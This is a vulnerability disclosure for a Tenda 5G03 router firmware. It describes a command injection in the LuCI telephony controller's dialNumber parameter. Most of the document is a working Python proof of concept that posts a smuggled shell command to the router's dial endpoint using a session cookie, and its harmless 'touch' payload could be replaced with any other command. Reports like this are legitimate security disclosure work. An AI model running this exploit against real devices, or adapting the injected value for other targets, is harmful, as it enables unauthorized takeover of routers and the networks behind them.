Submittion Date: 2026.3.16  
Vendor: 5G03  
Firmware: V05.03.02.04 (Version 1.0)  
Download Link: https://www.tenda.com.cn/material/show/4058  

In /usr/lib/lua/luci/controller/admin/telephony.lua, the function ```action_dial_call``` handles the important parameter string ```dialNumber``` without checking it, which leads to a command injection vulnerability.

![image](../image/action_dial_call-1.png)
![image](../image/action_dial_call-2.png)

The potentially attacking vector is as follows:  
```py
import requests

TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_call_dial_constant"
COOKIES = {"sysauth": "session_id"}

cmd = '10086"; touch /tmp/DIAL_VULN_PROVED; #'

data = {
    "Dial": "1",
    "dialNumber": cmd
}

try:
    response = requests.post(TARGET_URL, data=data, cookies=COOKIES, timeout=10)
    if response.status_code == 200:
        print("[+] Attack successfully")
    else:
        print(f"[-] Attack failed")
except Exception as e:
    print(f"[-] Error: {e}")
```
